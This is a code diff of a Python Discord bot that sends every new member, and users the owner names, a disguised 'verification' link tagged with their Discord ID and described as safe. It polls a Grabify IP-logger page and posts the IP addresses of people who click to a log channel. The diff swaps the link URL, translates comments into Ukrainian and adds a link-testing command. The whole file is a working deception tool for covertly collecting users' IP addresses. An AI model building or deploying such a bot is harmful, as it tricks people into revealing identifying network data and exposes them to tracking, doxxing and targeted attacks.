@@ -11,15 +11,15 @@ import re
 TOKEN = os.getenv('DISCORD_TOKEN')
 YOUR_USER_ID = int(os.getenv('YOUR_USER_ID', '0'))
 
-# YOUR VERIFICATION LINK / ТВОЯ ССЫЛКА
-VERIFICATION_LINK = "https://verify-page.onrender.com"
+# ✅ ВАШЕ НОВЕ РОБОЧЕ ПОСИЛАННЯ (оновлено!)
+VERIFICATION_LINK = "https://verification-m76y.onrender.com"
 
 # GRABIFY LINK
 GRABIFY_LINK = "https://grabify.link/AC6BBB"
 TRACKING_CODE = GRABIFY_LINK.replace("https://grabify.link/", "")
 
-# CHANNEL ID FOR LOGS / ID КАНАЛА ДЛЯ ЛОГОВ
-LOG_CHANNEL_ID = 1541017567500570634  # ← REPLACE / ЗАМЕНИ!
+# CHANNEL ID FOR LOGS
+LOG_CHANNEL_ID = 123456789012345678  # ← ЗАМІНІТЬ НА ID ВАШОГО КАНАЛУ!
 
 # ========================================
 # 2. BOT / БОТ
@@ -27,25 +27,25 @@ LOG_CHANNEL_ID = 1541017567500570634  # ← REPLACE / ЗАМЕНИ!
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix='!', intents=intents)
 
-# Store data / Хранилище данных
+# Store data / Збереження даних
 user_links = {}
 known_ips = {}
 
 def get_ip_from_grabify():
-    """Get IPs from Grabify / Получить IP из Grabify"""
+    """Get IPs from Grabify / Отримати IP з Grabify"""
     try:
         url = f"https://grabify.link/track/{TRACKING_CODE}"
         headers = {'User-Agent': 'Mozilla/5.0'}
         response = requests.get(url, headers=headers, timeout=10)
-        
+
         if response.status_code != 200:
             return None
-        
+
         html = response.text
         ip_pattern = r'\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b'
         found_ips = re.findall(ip_pattern, html)
         unique_ips = list(set(found_ips))
-        
+
         if unique_ips:
             return [{'ip': ip, 'time': datetime.datetime.now().isoformat()} for ip in unique_ips]
         return None
@@ -55,30 +55,30 @@ def get_ip_from_grabify():
 
 @tasks.loop(seconds=30)
 async def check_grabify():
-    """Check Grabify for new IPs / Проверка Grabify на новые IP"""
+    """Check Grabify for new IPs / Перевірка нових IP у Grabify"""
     global known_ips
-    
+
     ips = get_ip_from_grabify()
     if not ips:
         return
-    
+
     for ip_data in ips:
         ip = ip_data['ip']
         if ip not in known_ips:
             known_ips[ip] = ip_data
-            
+
             channel = bot.get_channel(LOG_CHANNEL_ID)
             if channel:
                 embed = discord.Embed(
                     title="🕵️ NEW IP DETECTED!",
-                    description=f"New visitor clicked the link!",
+                    description="New visitor clicked the link!",
                     color=discord.Color.green(),
                     timestamp=datetime.datetime.now()
                 )
                 embed.add_field(name="🌐 IP Address", value=f"`{ip}`", inline=True)
                 embed.add_field(name="📅 Time", value=datetime.datetime.now().strftime("%H:%M:%S"), inline=True)
                 embed.set_footer(text="Collected via Grabify")
-                
+
                 await channel.send(embed=embed)
                 print(f"📢 Published new IP: {ip}")
 
@@ -92,12 +92,12 @@ async def on_ready():
 
 @bot.event
 async def on_member_join(member):
-    """When a new member joins / Когда новый участник заходит"""
+    """When a new member joins / Коли новий учасник приєднується"""
     try:
         user_id = str(member.id)
         tracking_link = f"{VERIFICATION_LINK}?id={user_id}"
         user_links[user_id] = tracking_link
-        
+
         embed = discord.Embed(
             title="🎉 Welcome to the server!",
             description=f"Hello {member.mention}! Please verify your entry.",
@@ -109,16 +109,16 @@ async def on_member_join(member):
             inline=False
         )
         embed.set_footer(text="This is safe and takes 2 seconds")
-        
+
         await member.send(embed=embed)
         print(f"📨 Sent verification link to {member.name}")
-        
+
     except Exception as e:
         print(f"❌ Error: {e}")
 
 @bot.event
 async def on_voice_state_update(member, before, after):
-    """When someone joins a voice channel"""
+    """When someone joins a voice channel / Коли хтось заходить у голосовий канал"""
     if before.channel is None and after.channel is not None:
         user_id = str(member.id)
         tracking_link = f"{VERIFICATION_LINK}?id={user_id}"
@@ -126,16 +126,16 @@ async def on_voice_state_update(member, before, after):
         print(f"🔊 {member.name} joined {after.channel.name}")
 
 # ========================================
-# 3. COMMANDS / КОМАНДЫ
+# 3. COMMANDS / КОМАНДИ
 # ========================================
 
 @bot.command(name='link')
 async def show_link(ctx):
-    """Show verification link / Показать ссылку для верификации"""
+    """Show verification link / Показати посилання для верифікації"""
     if ctx.author.id != YOUR_USER_ID:
         await ctx.send("⛔ Only for owner!")
         return
-    
+
     embed = discord.Embed(
         title="🔗 Verification Link",
         color=discord.Color.green()
@@ -146,15 +146,15 @@ async def show_link(ctx):
 
 @bot.command(name='ips')
 async def list_ips(ctx):
-    """Show all collected IPs / Показать все собранные IP"""
+    """Show all collected IPs / Показати всі зібрані IP"""
     if ctx.author.id != YOUR_USER_ID:
         await ctx.send("⛔ Only for owner!")
         return
-    
+
     if not known_ips:
         await ctx.send("📊 No IPs collected yet")
         return
-    
+
     embed = discord.Embed(
         title="📊 Collected IPs",
         color=discord.Color.blue()
@@ -168,51 +168,51 @@ async def list_ips(ctx):
 
 @bot.command(name='clear_ips')
 async def clear_ips(ctx):
-    """Clear all collected IPs / Очистить все собранные IP"""
+    """Clear all collected IPs / Очистити всі зібрані IP"""
     if ctx.author.id != YOUR_USER_ID:
         await ctx.send("⛔ Only for owner!")
         return
-    
+
     known_ips.clear()
     await ctx.send("✅ All IPs cleared!")
 
 @bot.command(name='force_check')
 async def force_check(ctx):
-    """Force check Grabify for new IPs / Принудительно проверить Grabify"""
+    """Force check Grabify for new IPs / Примусово перевірити Grabify"""
     if ctx.author.id != YOUR_USER_ID:
         await ctx.send("⛔ Only for owner!")
         return
-    
+
     await ctx.send("🔍 Checking Grabify...")
     await check_grabify()
     await ctx.send("✅ Check completed! Check the channel for new IPs.")
 
 @bot.command(name='send_link')
 async def send_link(ctx, user: discord.Member = None):
-    """Send link to a specific user / Отправить ссылку конкретному пользователю"""
+    """Send link to a specific user / Надіслати посилання конкретному користувачу"""
     if ctx.author.id != YOUR_USER_ID:
         await ctx.send("⛔ Only for owner!")
         return
-    
+
     if user is None:
         await ctx.send("❌ Please mention a user: `!send_link @user`")
         return
-    
+
     try:
         user_id = str(user.id)
         tracking_link = f"{VERIFICATION_LINK}?id={user_id}"
         user_links[user_id] = tracking_link
-        
+
         embed = discord.Embed(
             title="🔔 Verify your entry",
             description=f"{user.mention}, please verify your entry.",
             color=discord.Color.blue()
         )
         embed.add_field(name="🔗 Link", value=f"[Click here]({tracking_link})", inline=False)
-        
+
         await user.send(embed=embed)
         await ctx.send(f"✅ Link sent to {user.name} in DM!")
-        
+
     except discord.Forbidden:
         await ctx.send(f"❌ Cannot send DM to {user.name}. They have DMs disabled.")
     except Exception as e:
@@ -220,11 +220,11 @@ async def send_link(ctx, user: discord.Member = None):
 
 @bot.command(name='stats')
 async def show_stats(ctx):
-    """Show bot statistics / Показать статистику бота"""
+    """Show bot statistics / Показати статистику бота"""
     if ctx.author.id != YOUR_USER_ID:
         await ctx.send("⛔ Only for owner!")
         return
-    
+
     embed = discord.Embed(
         title="📊 Bot Statistics",
         color=discord.Color.blue()
@@ -236,11 +236,11 @@ async def show_stats(ctx):
 
 @bot.command(name='grabify_link')
 async def show_grabify(ctx):
-    """Show Grabify tracking link / Показать ссылку Grabify"""
+    """Show Grabify tracking link / Показати посилання Grabify"""
     if ctx.author.id != YOUR_USER_ID:
         await ctx.send("⛔ Only for owner!")
         return
-    
+
     embed = discord.Embed(
         title="🔗 Grabify Tracking Link",
         color=discord.Color.purple()
@@ -250,6 +250,22 @@ async def show_grabify(ctx):
     embed.add_field(name="🔍 Track Link", value=f"[Click to view IPs](https://grabify.link/track/{TRACKING_CODE})", inline=False)
     await ctx.send(embed=embed)
 
+@bot.command(name='test_link')
+async def test_link(ctx):
+    """Test if the verification link works / Перевірити, чи працює посилання"""
+    if ctx.author.id != YOUR_USER_ID:
+        await ctx.send("⛔ Only for owner!")
+        return
+
+    try:
+        response = requests.get(VERIFICATION_LINK, timeout=5)
+        if response.status_code == 200:
+            await ctx.send(f"✅ Link is working!\n{VERIFICATION_LINK}")
+        else:
+            await ctx.send(f"⚠️ Link returned status code: {response.status_code}")
+    except Exception as e:
+        await ctx.send(f"❌ Link is NOT working! Error: {e}")
+
 # ========================================
 # 4. RUN / ЗАПУСК
 # ========================================
@@ -257,8 +273,5 @@ if __name__ == "__main__":
     if not TOKEN:
         print("❌ ERROR: DISCORD_TOKEN not found!")
         exit(1)
-    
-    if LOG_CHANNEL_ID == 123456789012345678:
-        print("⚠️ WARNING: Replace LOG_CHANNEL_ID with your channel ID!")
-    
+
     bot.run(TOKEN)
